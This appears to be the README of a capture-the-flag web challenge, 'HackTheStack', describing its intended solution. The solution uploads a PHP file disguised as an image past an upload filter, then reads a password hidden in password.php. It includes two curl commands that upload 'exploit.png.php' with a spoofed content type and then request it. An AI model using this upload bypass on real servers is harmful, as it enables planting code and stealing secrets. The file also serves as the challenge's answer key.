# HackTheStack

Need to upload a file and echo the contents of password.php. Password.php is used so it can live in the
same directory but the password content is in the comments, so it will never be served.

Ideally, the need to figure out first how to upload an image and get around the checks, then
they need to add some php to snoop around and find the file.

`curl -X POST -F 'uploadedfile=@exploit.png.php;type=image/php' 'http://server.com/upload.php'`
`curl 'http://server.com/uploads/exploit.png.php'`
